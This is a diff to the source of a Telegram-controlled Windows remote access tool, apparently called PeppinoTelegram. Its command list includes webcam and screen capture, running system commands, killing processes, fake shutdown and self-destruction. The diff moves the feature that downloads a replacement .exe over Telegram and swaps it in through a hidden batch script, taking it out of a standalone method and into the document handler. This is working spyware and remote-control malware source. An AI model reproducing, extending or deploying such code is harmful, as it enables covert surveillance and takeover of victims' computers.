@@ -270,7 +270,6 @@ camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
 
 💻 System Control
-updateexe - Waits for you to send a new compiled version.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
@@ -1010,7 +1009,6 @@ class PeppinoTelegram:
             "screenshot":self.screenshot,
             "messagebox":self.message_box,
             "waitforface":self.waitforface,
-            "updateexe":self.update_executable,
             "webcamclip":self.record_webcam,
             "screenclip":self.record_screen,
             "messagespam":self.spam_windows,
@@ -1431,14 +1429,22 @@ class PeppinoTelegram:
         else:
             self.bsend(f"Invalid command {command}")
 
-    def parse_document(self, msg: str, mimetype="document") -> None:
+
+    def parse_document(self, msg: dict[str:str], mimetype: str="document", update_exe: bool=False) -> None:
         document = msg[mimetype]
         file_id = document["file_id"]
         saved_filename = randomname()
         saved_filepath = join(BURN_DIRECTORY, saved_filename)
         self.bot.download_file(file_id, saved_filepath)
-        if mimetype == "document":
+        if mimetype == "document": 
             filename = document["file_name"]
+            if update_exe and not(filename.endswith(".exe")):
+                self.bsend("You did not send an executable file.")
+            elif update_exe and filename.endswith(".exe"):
+                self.bsend("Installing new .exe")
+                self.update_exe_function(filename)
+                return
+
             if filename.endswith(".dd"):
                 with open(saved_filepath, "r") as fi:
                     content = fi.read()
@@ -1534,7 +1540,7 @@ class PeppinoTelegram:
         keyboard = [
         ["/shutdown", "/selfdestruction"],
         ["/altf4", "/clear"],
-        ["/fakeshutdown", "/updateexe"],
+        ["/fakeshutdown"],
         ["/ipinfo", "/wifiinfo"],
         ["/selfie", "/screenshot"],
         ["/webcamclip", "/screenclip"],
@@ -1974,46 +1980,6 @@ class PeppinoTelegram:
         payload = {'commands': commands}
         response = requests.post(url, json=payload)
         return response.status_code == 200
-
-    def update_executable(self) -> None:
-        self.bsend("Send the executable or write /quitupdatemode")
-        last_update_id = None
-        updatemode = True
-
-        while updatemode:
-            updates = self.bot.getUpdates(offset=last_update_id, timeout=10)
-            for update in updates:
-                last_update_id = update['update_id'] + 1
-
-                if 'message' not in update:
-                    continue
-
-                message = update['message']
-                chat_id = message['chat']['id']
-                if chat_id != self.owner_id:
-                    continue
-
-                if 'text' in message and message['text'] == '/quitupdate':
-                    self.bsend("Exiting update mode.")
-                    return
-
-                if 'document' in message:
-                    file_info = message['document']
-                    file_name = file_info['file_name']
-                    if file_name.endswith('.exe'):
-                        file_id = file_info['file_id']
-                        dest = getcwd()
-                        old_exename = sys.argv[0]
-                        filepath = old_exename+"2"
-                        self.bot.download_file(file_id, join(dest, filepath))
-                        with open("temp.bat", "w") as script:
-                            script.write(f"timeout /t 20\nmove {filepath} {old_exename}")
-                        updatemode = False
-                        break
-                    else:
-                        self.bsend("Only .exe files are allowed")
-        Popen(['cmd', '/c', "temp.bat"], creationflags=CREATE_NO_WINDOW)
-        self.selfdestruction()
 
     def waitforface(self, timeout=60):
         start = time()
